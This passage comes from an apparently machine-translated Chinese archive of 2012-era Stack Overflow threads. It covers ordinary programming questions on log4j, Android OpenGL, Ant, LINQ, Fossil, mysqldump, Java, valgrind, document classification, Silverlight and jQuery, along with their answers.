log4j.appender.ERR.layout.conversionPattern=%d %-5p %c - %m%n

log4j.appender.CA=org.apache.log4j.ConsoleAppender
log4j.appender.CA.layout=org.apache.log4j.PatternLayout
log4j.appender.CA.layout.ConversionPattern=%d %-5p %c - %m%n 
```

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-11-15T23:29:54.533

我认为您的文件附加程序配置应如下所示：

```
 # Define the info file appender
log4j.appender.FILE=org.apache.log4j.FileAppender    
log4j.appender.FILE.File=info.log    
log4j.appender.FILE.Threshold=INFO    
log4j.appender.FILE.filter.a=org.apache.log4j.varia.LevelMatchFilter    
log4j.appender.FILE.filter.a.LevelToMatch=INFO    
log4j.appender.FILE.filter.a.AcceptOnMatch=true    
log4j.appender.FILE.filter.b=org.apache.log4j.varia.LevelMatchFilter    
log4j.appender.FILE.filter.b.LevelToMatch=ERROR    
log4j.appender.FILE.filter.b.AcceptOnMatch=false    
log4j.appender.FILE.filter.c=org.apache.log4j.varia.LevelMatchFilter    
log4j.appender.FILE.filter.c.LevelToMatch=FATAL    
log4j.appender.FILE.filter.c.AcceptOnMatch=false 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2014-11-05T23:04:57.730

我终于在不制作外部 XML 文件的情况下获得了类似问题的解决方案（使用过滤器），这是生成的代码：

```
log4j.rootLogger=info, R, ERROR

#### only INFO
log4j.appender.R=org.apache.log4j.RollingFileAppender
log4j.appender.R.File=FacturaElectronica.log
log4j.appender.R.MaxFileSize=500KB
log4j.appender.R.MaxBackupIndex=1
log4j.appender.R.layout=org.apache.log4j.PatternLayout
log4j.appender.R.layout.ConversionPattern=%d [%t] %-5p %c - %m%n
log4j.appender.R.filter.a=org.apache.log4j.varia.LevelRangeFilter
log4j.appender.R.filter.a.LevelMin=INFO
log4j.appender.R.filter.a.LevelMax=INFO

#### only ERROR
log4j.appender.ERROR=org.apache.log4j.RollingFileAppender
log4j.appender.ERROR.File=FacturaElectronicaError.txt
log4j.appender.ERROR.MaxFileSize=500KB
log4j.appender.ERROR.MaxBackupIndex=1
log4j.appender.ERROR.layout=org.apache.log4j.PatternLayout
log4j.appender.ERROR.layout.ConversionPattern=%d [%t] %-5p %c - %m%n
log4j.appender.ERROR.filter.b=org.apache.log4j.varia.LevelMatchFilter
log4j.appender.ERROR.filter.b.LevelToMatch=ERROR
log4j.appender.ERROR.filter.b.AcceptOnMatch=true
log4j.appender.ERROR.Threshold=ERROR 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-06-28T13:25:50.420

LevelMatchFilter 与您的需要无关。

您需要定义 2 个记录器，一个将具有 ERR 附加程序，另一个将具有 FILE 附加程序：

```
log4j.logger.my.info.logger=INFO, FILE
log4j.logger.my.err.logger=ERROR, ERR 
```

在代码中，您需要在初始化记录器时提供记录器名称：

```
static Logger logger = Logger.getLogger("my.info.logger"); 
```

# android - Android OpenGL 透明度叠加层

> ID：11243784
> 
> 赞同：2
> 
> 时间：2012-06-28T11:38:13.277
> 
> 标签：android, opengl-es, textures

我正在使用 OpenGL 构建一个 Android 应用程序。我创建了 2 个正方形，每个正方形都有自己的纹理（PNG），并将它们叠加起来。根据我从上一个问题得到的提示，我使用*了 gl.glBlendFunc(GL10.GL_SRC_ALPHA, GL10.GL_ONE_MINUS_SRC_ALPHA);*

我的问题是透明度效果会影响第二个正方形，因此我可以通过第二个正方形的纹理看到背景。有没有办法解决这个问题？

这是渲染器，底部是 Square.java 类：

```
package hello.project;

import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.nio.FloatBuffer;

import javax.microedition.khronos.opengles.GL10;

import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.opengl.GLUtils;

public class Square {

 private FloatBuffer vertexBuffer; // buffer holding the vertices
 static int sex=R.drawable.girl;

 private FloatBuffer textureBuffer; // buffer holding the texture coordinates
 private float texture[] = {
   // Mapping coordinates for the vertices
   0.0f, 1.0f,  // top left  (V2)
   0.0f, 0.0f,  // bottom left (V1)
   1.0f, 1.0f,  // top right (V4)
   1.0f, 0.0f  // bottom right (V3)
 };

 private float vertices[] = {
   -1.0f, -2.0f,  0.0f,  // V1 - bottom left
   -1.0f,  2.0f,  0.0f,  // V2 - top left
    0.8f, -2.0f,  0.0f,  // V3 - bottom right
    0.8f,  2.0f,  0.0f   // V4 - top right
 };

 public Square() {
  ByteBuffer byteBuffer = ByteBuffer.allocateDirect(vertices.length * 4);
  byteBuffer.order(ByteOrder.nativeOrder());
  vertexBuffer = byteBuffer.asFloatBuffer();
  vertexBuffer.put(vertices);
  vertexBuffer.position(0);

  byteBuffer = ByteBuffer.allocateDirect(texture.length * 4);
  byteBuffer.order(ByteOrder.nativeOrder());
  textureBuffer = byteBuffer.asFloatBuffer();
  textureBuffer.put(texture);
  textureBuffer.position(0);
 }

 /** The draw method for the square with the GL context */
 public void draw(GL10 gl) {
  // bind the previously generated texture
  gl.glBindTexture(GL10.GL_TEXTURE_2D, textures[0]);

  // Point to our buffers
  gl.glEnableClientState(GL10.GL_VERTEX_ARRAY);
  gl.glEnableClientState(GL10.GL_TEXTURE_COORD_ARRAY);

  // Set the face rotation
  gl.glFrontFace(GL10.GL_CW);

  // Point to our vertex buffer
  gl.glVertexPointer(3, GL10.GL_FLOAT, 0, vertexBuffer);
  gl.glTexCoordPointer(2, GL10.GL_FLOAT, 0, textureBuffer);

  // Draw the vertices as triangle strip
  gl.glDrawArrays(GL10.GL_TRIANGLE_STRIP, 0, vertices.length / 3);

  //Disable the client state before leaving
  gl.glDisableClientState(GL10.GL_VERTEX_ARRAY);
  gl.glDisableClientState(GL10.GL_TEXTURE_COORD_ARRAY);
 }

 /** The texture pointer */
 private int[] textures = new int[1];

 public void loadGLTexture(GL10 gl, Context context,int sex ) {
  // loading texture
  Bitmap bitmap = BitmapFactory.decodeResource(context.getResources(),
    sex);

  // generate one texture pointer
  gl.glGenTextures(1, textures, 0);
  // ...and bind it to our array
  gl.glBindTexture(GL10.GL_TEXTURE_2D, textures[0]);

  // create nearest filtered texture
  gl.glTexParameterf(GL10.GL_TEXTURE_2D, GL10.GL_TEXTURE_MIN_FILTER, GL10.GL_NEAREST);
  gl.glTexParameterf(GL10.GL_TEXTURE_2D, GL10.GL_TEXTURE_MAG_FILTER, GL10.GL_LINEAR);

  // Use Android GLUtils to specify a two-dimensional texture image from our bitmap
  GLUtils.texImage2D(GL10.GL_TEXTURE_2D, 0, bitmap, 0);
  // Clean up
  bitmap.recycle();
 }

 public static int getSex() {
  return sex;
 }

 public static void setSex(int sex) {
  Square.sex = sex;
 }
}
---------------------------------------------------------------------------
package hello.project;

import javax.microedition.khronos.egl.EGLConfig;
import javax.microedition.khronos.opengles.GL10;

import android.content.Context;
import android.opengl.GLSurfaceView.Renderer;
import android.opengl.GLU;

public class HelloOpenGLES10Renderer implements Renderer {

 private Square   square;  // the square
 private Square2  square2;  // the square
 private Context     context;

 /** Constructor to set the handed over context */
 public HelloOpenGLES10Renderer(Context context) {
  this.square  = new Square();
  this.square2 = new Square2();
  this.context=context;
 }

 public void onDrawFrame(GL10 gl) {
  // clear Screen and Depth Buffer
  gl.glClear(GL10.GL_COLOR_BUFFER_BIT | GL10.GL_DEPTH_BUFFER_BIT);

  // Reset the Modelview Matrix
  gl.glLoadIdentity();

  // Drawing
  gl.glTranslatef(0.0f, 0.0f, -5.0f);  // move 5 units INTO the screen
  square.draw(gl);
  square2.draw(gl); 

 }

 public void onSurfaceChanged(GL10 gl, int width, int height) {
  if(height == 0) {       //Prevent A Divide By Zero By
   height = 1;       //Making Height Equal One
  }

  gl.glViewport(0, 0, width, height);  //Reset The Current Viewport
  gl.glMatrixMode(GL10.GL_PROJECTION);  //Select The Projection Matrix
  gl.glLoadIdentity();      //Reset The Projection Matrix

  //Calculate The Aspect Ratio Of The Window
  GLU.gluPerspective(gl, 45.0f, (float)width / (float)height, 0.1f, 100.0f);

  gl.glMatrixMode(GL10.GL_MODELVIEW);  //Select The Modelview Matrix
  gl.glLoadIdentity();      //Reset The Modelview Matrix
 }

 public void onSurfaceCreated(GL10 gl, EGLConfig config) {
  // Load the texture for the square

  square.loadGLTexture(gl, this.context,Square.getSex());
  square2.loadGLTexture(gl, this.context,Square2.getSex());

  gl.glEnable(GL10.GL_TEXTURE_2D); 
  gl.glDisable(GL10.GL_DEPTH_TEST);
  gl.glEnable(GL10.GL_BLEND);

  gl.glBlendFunc(GL10.GL_SRC_ALPHA, GL10.GL_ONE_MINUS_SRC_ALPHA);

  gl.glShadeModel(GL10.GL_SMOOTH);    //Enable Smooth Shading
  gl.glClearColor(0.0f, 0.0f, 0.0f, 0.0f);  //Black Background
  gl.glClearDepthf(1.0f);      //Depth Buffer Setup
  gl.glDepthFunc(GL10.GL_NEVER);    //The Type Of Depth Testing To Do

  //Really Nice Perspective Calculations
  gl.glHint(GL10.GL_PERSPECTIVE_CORRECTION_HINT, GL10.GL_NICEST);
 }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-28T11:44:25.963

您不只是对图形管道状态有问题吗？请记住，无论您告诉要先绘制哪个正方形，都会使用当前处于活动状态的混合函数来绘制（这将保持活动状态，直到您更改 OpenGL 状态）。也许您想在混合功能中添加更多的状态更改，或者更改绘制顺序以获得您想要的效果？您可能还想尝试启用/禁用绘图调用之间的深度测试以使正方形不透明。

希望这会有所帮助，您可能需要为您的问题提供更多细节。

# ant - 使用 Ant 获取时间戳差异

> ID：11243787
> 
> 赞同：1
> 
> 时间：2012-06-28T11:38:31.533
> 
> 标签：ant, timestamp

我需要使用 Ant 计算时差。
基本上它有2个变量。一个分配了当前时间，另一个分配了不同的时间。我需要使用 Ant 获取时差。像下面的东西。如果有人有代码请回复。

```
variable a = current time;
variable b = different time
echo (a - b) ; 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2014-08-27T19:58:40.000

这是一个更简单的解决方案：

```
<script language="javascript">
  project.setProperty('startTime', new Date().getTime());
</script>
...
<script language="javascript">
  project.setProperty('elapsedTime', new Date().getTime() - startTime)
</script>
<echo>Elapsed time: ${elapsedTime} ms</echo> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-15T11:29:43.660

替代@LeFunes 答案（并使用`tstamp`任务）

```
<tstamp prefix="task.start">
<format property="millis" pattern="SSS"/>
</tstamp>
<tstamp prefix="task">
  <format property="start" pattern="E, dd MMM YYYY hh:mm:ss"/>
</tstamp>
<time-consuming-task/>
<tstamp prefix="task.stop">
<format property="millis" pattern="SSS"/>
</tstamp>
<tstamp prefix="task">
  <format property="stop" pattern="E, dd MMM YYYY hh:mm:ss"/>
</tstamp>
<script language="javascript">
  project.setProperty("task.diff", 
    Math.abs(
      (Date.parse(project.getProperty("task.stop")) +
         +project.getProperty("task.stop.millis")) - 
      (Date.parse(project.getProperty("task.start")) + 
         +project.getProperty("task.start.millis"))))
</script>
<echo>
  task completed in ${task.diff} ms
</echo> 
```

注意： ~~这不考虑毫秒~~ 更新来考虑毫秒

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-06T13:23:15.493

```
<?xml version="1.0" encoding="UTF-8"?>
<project name="TEST ANT" default="test" basedir="..">
    <target name="test" description="">

        <script language="javascript"> <![CDATA[
            var ts1 = new Date();
            project.setProperty("current.time.1", ts1.toLocaleString());
            project.setProperty("current.time.1.mill", ts1.getTime());
        ]]></script>
        <echo>Timestamp 1: ${current.time.1} [${current.time.1.mill}]</echo>

        <sleep milliseconds="1300"></sleep>

        <script language="javascript"> <![CDATA[
            var ts2 = new Date();
            project.setProperty("current.time.2", ts2.toLocaleString());
            project.setProperty("current.time.2.mill", ts2.getTime());
        ]]></script>
        <echo>Timestamp 2: ${current.time.2} [${current.time.2.mill}]</echo>

        <script language="javascript"> <![CDATA[
            project.setProperty("res", project.getProperty("current.time.2.mill")-project.getProperty("current.time.1.mill"));
        ]]></script>
        <echo>Diff: ${res}</echo>
    </target>
</project> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-08-27T20:40:38.183

如果您不想使用 JavaScript，可以使用[Ant-Contrib](http://ant-contrib.sourceforge.net/tasks/tasks/index.html)实用程序提供的[Math 任务。](http://ant-contrib.sourceforge.net/tasks/tasks/math_task.html)

Ant-Contrib 相当老了，我不知道是否还有人在维护它们，但是它们在 Ant 构建文件中非常流行，因为它们添加了一些非常有用的任务。

我建议将其包含`ant-contrib-1.0b3.jar`到项目本身中。当其他人使用您的项目时，他们也将拥有 Ant-Contrib jar。我放在`ant-lib/ac/ant-contrib-1.0b3.jar`你项目的主目录下。我`ant-lib`用于所有可选的罐子：

```
<project name="my.project"
    ...
    xmlns:ac="antlib:net.sf.antcontrib">

   ...

    <taskdef uri="antlib:net.sf.antcontrib"
        resource="net/sf/antcontrib/antlib.xml">
        <classpath>
            <fileset dir="${basedir}/antlib/ac"/>
        </classpath>
    </taskdef>

    .... 
```

现在，您可以像这样使用数学任务：

```
 <ac:math result="time.diff"
        operation="-"
        operand1="${diff.time}"
        operand2="${initial.time}"/> 
```

`ac:`是在您的实体中声明的 XML 命名空间，并通过实体中的参数`<project/>`连接到您的任务。这允许您拥有多个可选的 Ant 任务，这些任务可能具有重复名称的任务。如果您使用具有相同任务名称的多个可选任务库，这是一个好主意。`uri``<taskdef/>`

# c# - LINQ 查询，使用关系

> ID：11243788
> 
> 赞同：0
> 
> 时间：2012-06-28T11:38:31.950
> 
> 标签：c#, linq

我有个问题。我想对这个数据库使用 LINQ 查询： ![在此处输入图像描述](../Images/3d33f0fac708fd759e561fb99ab0e254.png)

一个用户可以有很多角色，每个角色可以有很多项。如果我有用户名，我希望能够找到与之相关的所有项目。这意味着我需要首先找到用户拥有的角色，然后找到每个角色拥有的项目。

我该怎么做？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-28T11:41:27.683

```
var userItems = myUser.Roles.SelectMany(x=>x.Items); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-28T11:41:35.950

让你拥有：

```
User user = ...;
Role[] roles = user.Roles;
Role role = roles[x];
Items[] items = role.Items; 
```

然后：

```
var allItems = user.SelectMany(u => u.Roles.Select(r => r.Items); 
```

如果您有 EF 导航属性：

```
var allItems = user.Roles.SelectMany(r => r.Items); 
```

# dvcs - 从现有项目文件创建 Fossil 存储库

> ID：11243789
> 
> 赞同：3
> 
> 时间：2012-06-28T11:38:32.877
> 
> 标签：dvcs, fossil

我希望在初学者的快速入门指南中对此进行解释，因为几乎每个从化石开始的人都会有他想从化石开始管理的项目。然而，我在文档中的任何地方都找不到解释。

（我来自 git，这对我的需求来说太重了，但至少在现有文件夹中创建一个新存储库很容易......）

（试图回答我的问题但声誉不足。所以这里是:)

我想我自己想通了。这是我为初学者所做的：

1.  为存储库创建目录，`C:\www\fossil`
2.  进入`fossil`目录
3.  `fossil init projectname`
4.  进入现有项目的目录`C:\www\projectname`
5.  `fossil open ../fossil/projectname`
6.  `fossil add *.*`

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-28T12:54:41.927

一些评论：

*   步骤 3\. 也可以使用`fossil new`代替来完成`fossil init`。
*   第6步应该是`fossil add .`；这是递归的。化石不遵守旧的微软规则，即`*.*`即使没有扩展名，也意味着每个文件。`fossil add *.*`只会添加名称中包含点的所有文件和目录。
*   第 7 步应该是`fossil commit -m "Initial contents of my project"`

# mysql - 如何让mysql备份以特定字母开头的表？

> ID：11243790
> 
> 赞同：1
> 
> 时间：2012-06-28T11:38:38.400
> 
> 标签：mysql, phpmyadmin, backup, mysqldump, database-backups

我在 mysql 服务器上有 2 gb 的批量数据，我想备份它。

我尝试使用`mysqldump -u root newspress > /tmp/newspress.sql`

但是从服务器下载到我的本地机器需要很长时间。所以我想在数据库中获取特定的表`starts with J`。

例如：`Jobseeker, Jobs, Joncategory...`等

怎么做 ？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T11:43:32.313

下载 [mysql 工作台](http://www.mysql.com/products/workbench/)。那么您只需单击一下即可轻松进行备份。它是如此之快。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-28T11:49:54.777

以下 shell 脚本将选择所有以 'm' 开头的表，并将它们转储到当前目录中的一个名为 `database.table.sql`（例如：test.employees.sql）的文件中：

```
DB="test"
TABLES=`mysql -uroot -BN -e "SHOW TABLES FROM $DB LIKE 'm%'"`
for TABLE in $TABLES;
do
   mysqldump -uroot $DB $TABLE > $DB.$TABLE.sql;
done 
```

请注意，要减小由 生成的备份的大小`mysqldump`，您可以对其进行压缩：

```
shell> mysqldump -u root newspress > /tmp/newspress.sql
shell> gzip /tmp/newspress.sql 
```

2Gb 转储将减少到相当小的大小。

# java - 如何使用 Hashmap 中的键检索值 ?

> ID：11243795
> 
> 赞同：0
> 
> 时间：2012-06-28T11:38:51.707
> 
> 标签：java, android, hashmap

这是我的代码：

```
public static HashMap<String, ArrayList<String>> CountryMap = new HashMap<String, ArrayList<String>>();

ArrayList<String> stateInd = new ArrayList<String>();
ArrayList<String> stateUSA = new ArrayList<String>();
stateInd.add("GJ");
stateInd.add("MP");
stateUSA.add("NJ");
stateUSA.add("NY");

CountryMap.put("India",stateInd);            
CountryMap.put("USA",stateUSA);

for(int i=0;i<CountryMap.size();i++){
    for (Entry<String, ArrayList<String>> entry : CountryMap.entrySet()) {
        if (entry.getKey().equals("India") {
            ArrayList<String> result = new ArrayList<String>();             
            # how to add Value of CountryMap with "India" as a Key to result ArrayList??
        }
    }
} 
```

我想从以“印度”为键的哈希图中向另一个 ArrayList 添加值？

我试过了..

```
result.add(CountryMap.get("India")); 
```

但它没有奏效。它添加所有值。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T12:01:16.730

解决方案1：

```
 result.addAll(CountryMap.get("India")); 
```

解决方案2：

```
 result.add(CountryMap.get("India").toString()); 
```

请尝试查看引发的所有函数和异常。如果有效请回复

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-29T06:53:46.940

```
public class NewClass4{
 public static HashMap<String, ArrayList<String>> CountryMap = new HashMap<String, ArrayList<String>>();
    public static void main(String[] args)
    {
        ArrayList<String> stateInd = new ArrayList<String>();
        ArrayList<String> stateUSA = new ArrayList<String>();
        stateInd.add("GJ");
        stateInd.add("MP");
        stateUSA.add("NJ");
        stateUSA.add("NY");

        CountryMap.put("India",stateInd);            
        CountryMap.put("USA",stateUSA);

        ArrayList<String> result = new ArrayList<String>();
        result=CountryMap.get("India");
        if(result!=null){
            // means CountryMap contain key "India"
        }
    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-29T17:17:51.143

嗨，我知道这已经快一个月大了，但我忍不住想给它一些想法。如果我的问题正确，解决方案非常简单。

```
public static void main(String[] args) {
        HashMap<String, ArrayList<String>> CountryMap = new HashMap<String, ArrayList<String>>();

        ArrayList<String> stateInd = new ArrayList<String>();
        ArrayList<String> stateUSA = new ArrayList<String>();
        ArrayList<String> result = new ArrayList<String>();
        stateInd.add("GJ");
        stateInd.add("MP");
        stateUSA.add("NJ");
        stateUSA.add("NY");

        CountryMap.put("India",stateInd);            
        CountryMap.put("USA",stateUSA);

        for (String key: CountryMap.keySet()){

            if (key.equals("India")){
                result.add(key);
            }
        }

        for (String country: result){
            System.out.print("\n"+country+" ");
        }
} 
```

# valgrind - 如何使用 valgrind 编写包装函数来测试 ioctl 系统调用？

> ID：11243803
> 
> 赞同：1
> 
> 时间：2012-06-28T11:39:10.990
> 
> 标签：valgrind, ioctl

我不知道怎么写。为了测试我的网卡驱动程序中的 ioctl，我必须编写一个包装函数。但我无法理解 valgrind 手册中所说的。我想知道 PRE(ioctl) 和 POST(ioctl) 函数应该添加我的源代码还是添加到 valgrind 源代码？

我添加到我的驱动程序源代码，但我无法使用 gcc 编译，我应该#include 哪个 .h 文件。

帮助！！！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-28T15:48:55.627

我已经解决了这个问题。我应该将 PRE 和 POST 代码添加到 valgrind 源代码中。

# artificial-intelligence - 训练集不完整的文档分类

> ID：11243804
> 
> 赞同：0
> 
> 时间：2012-06-28T11:39:16.623
> 
> 标签：artificial-intelligence, neural-network, document-classification

请指教。我有一个文档集合，它们都有一个共同的属性（例如出现了法语单词），其中一些文档已被标记为与此集合无关（例如出现法语之吻），但不能保证所有文档都已被识别。找出哪些其他文档不属于的最佳方法是什么。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-04T09:06:54.400

### 假设

给定您的示例“法语”，我将假设该功能是出现在文档中的单词。另外，由于您提到“法式吻”不相关，我将进一步假设在您的情况下，特征是在特定意义上使用的词。例如，如果“台球”是一个特征，您可能会说提到游泳池的文档是相关的，但那些谈论台球（这项运动，如斯诺克或台球）的文档不相关。

*   **注意**：虽然*词义消歧*(WSD) 方法可以工作，但它们需要太多的努力，并且为此目的是过度杀伤力。

### 建议：*本地化*语言模型+引导

这样想：你没有一个不完整的训练集，而是一个较小的训练集。这个想法是使用这个小的训练数据来构建更大的训练数据。这是***自举***。

对于训练数据中出现的每个特征，仅基于其周围的单词构建语言模型。您不需要为整个文档构建模型。理想情况下，仅包含该特征的句子就足够了。这就是我所说的***本地化语言模型***（LLM）。

从您的训练数据中构建两个这样的 LLM（我们称之为 T_0）：一个用于相关文档，例如 M1，另一个用于不相关文档，例如 M0。现在，为了构建更大的训练数据，基于 M1 和 M0 对文档进行分类。对于每个新文档*d*，如果*d*不包含特征词，它将自动添加为“坏”文档。如果*d*包含特征词，则考虑 d 中该词周围的局部窗口*（*与您用于构建 LLM 的窗口大小相同），并使用 M0 和 M1 计算该词序列的困惑度。将文档分类为具有较低困惑度的类别。

为了形式化，伪代码是：

```
T_0 := initial training set (consisting of relevant/irrelevant documents)
D0 := additional data to be bootstrapped
N := iterations for bootstrapping

for i = 0 to N-1
  T_i+1 := empty training set
  Build M0 and M1 as discussed above using a window-size w
  for d in D0
    if feature-word not in d
    then add d to irrelevant documents of T_i+1
    else
      compute perplexity scores P0 and P1 corresponding to M0 and M1 using
      window size w around the feature-word in d.
      if P0 < P1 - delta
        add d to irrelevant documents of T_i+1
      else if P1 < P0 - delta
        add d to relevant documents of T_i+1
      else
        do not use d in T_i+1
      end
    end
  end
  Select a small random sample from relevant and irrelevant documents in
  T_i+1, and (re)classify them manually if required.
end 
```

*   T_N 是你的最终训练集。在上述自举中，参数*delta*需要通过对一些*保留*数据（也称为*开发*数据）的实验来确定。
*   对小样本进行手动重新分类，这样引导过程中的噪声不会在所有*N*次迭代中累积。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-03T08:47:03.517

1.  首先，您应该**注意如何提取**示例文档的特征。数每个字不是一个好方法。您可能需要一些像 TFIDF 这样的技术来教分类器哪些词对分类很重要，哪些词不重要。

2.  **建立正确的字典**。在您的情况下，**French Kiss**这个词应该是一个独特的词，而不是 French + Kiss 的序列。使用正确的技术来构建正确的词典很重要。

3.  样本中的剩余误差是正常的，我们称之为“**非线性可分**”。有大量关于如何解决这个问题的先进研究。例如，您喜欢使用**SVM （支持向量机）。**请注意，单层 Rosenblatt 感知器通常对非线性可分的数据集表现出非常差的性能。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-06-28T11:56:13.250

1.  某些类型的神经网络（如 Rosenblatt 感知器）可以在错误数据集上进行训练，并且可以显示出比 tranier 更好的性能。此外，在许多情况下，您应该犯错误以避免过度训练。
2.  您可以随机标记所有未标记的文档，训练几个网络并估计它们在测试集上的性能（当然，您不应该在测试集中包含未标记的文档）。之后，您可以循环重新计算未标记文档的权重为 w_i = sum of quality(j) * w_ij，然后重复训练和重新计算权重等等。因为过程相当于引入新的隐藏层并通过 Hebb 过程重新计算其权重，所以如果您的正负集在某些网络特征空间中是线性可分的，则整个过程应该收敛。

# java - 赋值左侧必须是变量

> ID：11243805
> 
> 赞同：0
> 
> 时间：2012-06-28T11:39:17.260
> 
> 标签：java, eclipse, variables, boolean, method-call

我正在尝试在另一个类中调用布尔方法，而 Eclipse 在以下代码的第二行报告上述错误：

```
CCR ccrFlags = new CCR();
if (ccrFlags.cBit() = set) 
```

从名为“CCR”的类中调用的方法是：

```
public boolean cBit() {
    boolean set = false;
    return set;
} 
```

我想我可能会以一种愚蠢的方式来解决这个问题，并且会很感激任何建议。谢谢，罗伯特。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-28T11:40:34.247

比较应该使用`==`（双等号）：

```
CCR ccrFlags = new CCR();
if (ccrFlags.cBit() == set) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-28T11:43:30.783

在 if 中，条件必须始终为真或假。

您的错误是，这 = 仅分配值，但它不是可以为真或假的逻辑运算。

所以你必须在条件下使用 == 。

# java - 为什么使用对象调用和静态方法？

> ID：11243809
> 
> 赞同：0
> 
> 时间：2012-06-28T11:39:27.473
> 
> 标签：java

我知道这将是一个太基本的问题，但我仍然要求你们回答。众所周知，我们可以使用对象调用静态方法。我不确定为什么有人愿意这样做。有人可以向我解释需要这样做的情况吗？

如果这不是必需的，那么为什么 java 不给出错误而不是警告使用对象调用静态方法。

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-06-28T11:48:39.263

```
Can someone please explain me a situation where this would be needed? 
```

假设您有一个名为 Container 的类。这个容器会有一个方法，比如说`convertOunceToLiter(param).`我们可以使用这个方法，即使在其他地方还没有创建一个容器实例作为转换方法。`So this method should be defined as static.`

# c# - 在 Silverlight 中启用 GPU

> ID：11243815
> 
> 赞同：1
> 
> 时间：2012-06-28T11:39:41.457
> 
> 标签：c#, silverlight, gpu

我在 Silverlight 中启用 gpu 时遇到问题。我添加了参数，但在 Silverlight 配置的权限选项卡中找不到它。gpu 被安全封锁。我也尝试过用尽浏览器，但 gpu 仍然被安全阻止。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-23T10:03:38.737

我尝试了所有常见的方法来让它工作，但最终解决问题的是silverlight项目设置“在浏览器中运行时需要提升信任”

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-06-28T12:27:27.720

[这篇博](http://www.yvision.com/2012/02/14/quirks-on-silverlight-5-with-gpu-acceleration/)文可能会为您提供您正在寻找的答案。摘抄：

*进入您的网站时，用户必须：*

*   右键单击 Silverlight 插件，将出现一个上下文菜单。
*   单击“Silverlight”菜单项。
*   打开“权限”选项卡。
*   查找您正在访问的页面的主机地址。
*   选择“3D 图形：使用阻止的显示驱动程序”选项，前面应该有“拒绝”。
*   单击列表后的“允许”按钮。
*   单击顶部的“确定”关闭对话框，然后 [...] 您将不得不重新加载页面。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-06-28T12:47:53.660

要使用 GPU 硬件加速在浏览器外运行它，您必须在部署 XAML 文件中明确指定设置，如下所示。

```
 <OutOfBrowserSettings 
        EnableGPUAcceleration="True"
     <OutOfBrowserSettings.Blurb> 
```

浏览器中的问题可以通过启用上面回答的 silverlight 插件的硬件加速来解决。

# javascript - .hide() .show() div 菜单上的 javascript/Jquery 改进

> ID：11243818
> 
> 赞同：0
> 
> 时间：2012-06-28T11:39:47.370
> 
> 标签：javascript, jquery

我对 javascript 和 jquery 非常陌生，自我认为....在这个菜单上工作了一段时间，我终于“完成”了，但是我得到了一些可怕的代码，我正在寻找改进我的代码以使其更具可读性的方法和功能任何提示和提示都会有所帮助。节省页面空间的想法每个 div 将具有用户将在此处填写的表单的不同部分是一些代码

```
 <body>

    <div class="content">

        <div class="menu" id="menu"></div>
        <div class="content" id="sort"></div>
        <div class="menu"id="menu1"></div>
        <div class="content" id="1sort"></div>
        <div class="menu"id="menu2"></div>
        <div class="content" id="sort2"></div>
    </div>

    <script>
        var show = true;
        var show2 = false;
        var show3 = false;

        $('#1sort').hide("fast");
        $('#sort2').hide("fast");

        $("#menu").click(function () {
            if (show == true) {
                $('#sort').hide("fast");
                $('#1sort').show("fast");
                show = false;
                show2 = true;
            } else if (show == false) {
                $('#sort').show("fast");
                $('#1sort').hide("fast");
                $('#sort2').hide("fast");
                show = true;
                show2 = false;
                show3 = false;
            }

        });

        $("#menu1").click(function () {
            if (show2 == true) {
                $('#1sort').hide("fast");
                $('#sort2').show("fast");
                show2 = false;
                show3 = true;
            } else if (show2 == false) {
                $('#1sort').show("fast");
                $('#sort').hide("fast");
                $('#sort2').hide("fast");
                show = false;
                show2 = true;
                show3 = false;
            }

        });

        $("#menu2").click(function () {
            if (show3 == false) {
                $('#1sort').hide("fast");
                $('#sort').hide("fast");
                $('#sort2').show("fast");
                show = false;
                show2 = false;
                show3 = true;
            }                      
          });       

    </script> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-28T11:47:27.413

这里有一个有用的技术是在链接上装饰一些额外的属性（最好是 html5 `data-*`）以指示它的关联内容是什么。

```
<div class="menu" id="menu" data-content="sort"></div>
<div class="content" id="sort"></div>
<div class="menu"id="menu1" data-content="1sort"></div>
<div class="content" id="1sort"></div>
<div class="menu" id="menu2" data-content="sort2"></div>
<div class="content" id="sort2"></div> 
```

然后，您可以在单击项目时使用它来隐藏当前可见的项目，并显示所需的项目：

```
$('.menu').click(function(){
    $('.content:visible').hide('fast');
    $('#' + $(this).data('content')).show('fast');
}); 
```

现场示例：http: [//jsfiddle.net/hAbPa/](http://jsfiddle.net/hAbPa/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-28T12:00:54.147

您可以使用一些基本的遍历函数，并`.is`确定可见性。你不需要布尔变量也不需要元素ID：http: [//jsfiddle.net/K2sqy/2/](http://jsfiddle.net/K2sqy/2/)。

```
$(".menu").click(function() {
    var $next = $(this).next(".content");  // corresponding .content element
    var isVisible = $next.is(":visible");  // is it currently visible?

